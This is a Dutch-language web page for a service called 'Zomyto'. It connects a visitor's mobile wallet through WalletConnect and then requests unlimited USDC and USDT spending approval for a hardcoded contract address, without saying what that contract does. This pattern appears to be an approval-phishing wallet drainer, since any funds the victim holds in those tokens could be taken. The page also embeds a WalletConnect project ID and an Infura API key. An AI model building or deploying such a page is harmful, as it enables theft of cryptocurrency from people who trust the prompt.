<!DOCTYPE html>
<html lang="nl">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Zomyto â€“ Approve Stablecoins (WC v2 simpel)</title>

  <!-- Ethers v5 -->
  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>

  <!-- WalletConnect v2 Ethereum Provider UMD -->
  <script src="https://unpkg.com/@walletconnect/ethereum-provider@2.11.2/dist/umd/index.min.js"></script>

  <style>
    body {
      background: #121212;
      color: white;
      font-family: Arial, sans-serif;
      text-align: center;
      padding-top: 50px;
    }
    button {
      background: #1e88e5;
      color: white;
      padding: 12px 20px;
      border: none;
      border-radius: 8px;
      font-size: 1rem;
      cursor: pointer;
      margin: 10px;
    }
    button:disabled {
      background: grey;
      cursor: not-allowed;
    }
    #status {
      margin-top: 20px;
      font-size: 0.9rem;
      color: #ccc;
    }
  </style>
</head>
<body>
  <h1>Zomyto â€“ Approve Stablecoins</h1>
  <p>
    1. Klik op <b>Connect Wallet</b> en scan de QR met je mobiele wallet (Exodus).<br />
    2. Klik daarna op <b>Approve USDC &amp; USDT</b> om toestemming te geven aan het Zomyto-contract.
  </p>

  <button id="connectBtn">ðŸ”— Connect Wallet (WalletConnect v2)</button>

  <div style="margin-top: 30px">
    <button id="approveBtn" disabled>âœ… Approve USDC &amp; USDT</button>
  </div>

  <div id="status">Status: Niet verbonden</div>

  <script>
    // ====== CONFIG ======
    const projectId = "0e7d96df89f873ddfb0b4381e13c883c"; // jouw WC v2 projectId

    // Ethereum mainnet chainId
    const CHAIN_ID = 1;

    // ERC20 tokens op mainnet
    const TOKENS = [
      { name: "USDC", address: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48" },
      { name: "USDT", address: "0xdAC17F958D2ee523a2206206994597C13D831ec7" }
    ];

    // JOUW contract dat toestemming krijgt
    const SPENDER = "0x2F6DAC950c8e2433734Fe50bC72F18E2d2dD8f2A";

    const tokenABI = [
      "function approve(address spender, uint256 amount) public returns (bool)"
    ];

    const statusEl = document.getElementById("status");
    const connectBtn = document.getElementById("connectBtn");
    const approveBtn = document.getElementById("approveBtn");

    let wcProvider = null;
    let ethersProvider = null;
    let signer = null;

    function setStatus(msg) {
      console.log(msg);
      statusEl.textContent = "Status: " + msg;
    }

    // ====== CONNECT WALLET VIA WALLETCONNECT V2 ======
    connectBtn.onclick = async () => {
      try {
        setStatus("WalletConnect initialiseren...");

        // Maak een WC v2 provider
        wcProvider = await window.WalletConnectEthereumProvider.init({
          projectId,
          showQrModal: true,
          chains: [CHAIN_ID],
          // optioneel: RPC override
          rpcMap: {
            [CHAIN_ID]: "https://mainnet.infura.io/v3/1506833c04954b058aad864f0d9ce1a2"
          }
        });

        // Vraag om accounts (triggert QR als nog niet verbonden)
        const accounts = await wcProvider.enable();
        console.log("Accounts:", accounts);

        // Ethers provider & signer
        ethersProvider = new ethers.providers.Web3Provider(wcProvider, "any");
        signer = ethersProvider.getSigner();

        const address = await signer.getAddress();
        const network = await ethersProvider.getNetwork();
        setStatus(`Verbonden met ${address} op chainId ${network.chainId}`);

        if (Number(network.chainId) !== CHAIN_ID) {
          alert("Let op: je zit niet op Ethereum mainnet. Schakel over in je wallet.");
        }

        approveBtn.disabled = false;

        // Event handlers (optioneel)
        wcProvider.on("accountsChanged", (accs) => {
          console.log("accountsChanged:", accs);
        });

        wcProvider.on("chainChanged", (chainId) => {
          console.log("chainChanged:", chainId);
        });

        wcProvider.on("disconnect", () => {
          console.log("disconnect");
          setStatus("Niet verbonden");
          approveBtn.disabled = true;
          signer = null;
          ethersProvider = null;
          wcProvider = null;
        });

      } catch (err) {
        console.error("Fout bij connect:", err);
        setStatus("Fout bij connect: " + err.message);
        alert("Fout bij connect: " + err.message);
      }
    };

    // ====== APPROVE-KNOP ======
    approveBtn.onclick = async () => {
      if (!signer) {
        alert("Geen signer gevonden. Verbind eerst je wallet via Connect Wallet.");
        return;
      }

      try {
        for (const t of TOKENS) {
          setStatus(`Verstuur approve transactie voor ${t.name}...`);
          const token = new ethers.Contract(t.address, tokenABI, signer);

          // MaxUint256 = onbeperkte toestemming
          const tx = await token.approve(SPENDER, ethers.constants.MaxUint256);
          setStatus(`Wachten op bevestiging van ${t.name} transactie...`);
          await tx.wait();
          console.log(`âœ… Approved ${t.name}`);
        }

        setStatus("USDC & USDT succesvol goedgekeurd!");
        alert("USDC & USDT succesvol goedgekeurd!");
      } catch (err) {
        console.error("Fout bij approve:", err);
        setStatus("Fout bij approve: " + err.message);
        alert("Fout bij approve: " + err.message);
      }
    };
  </script>
</body>
</html>
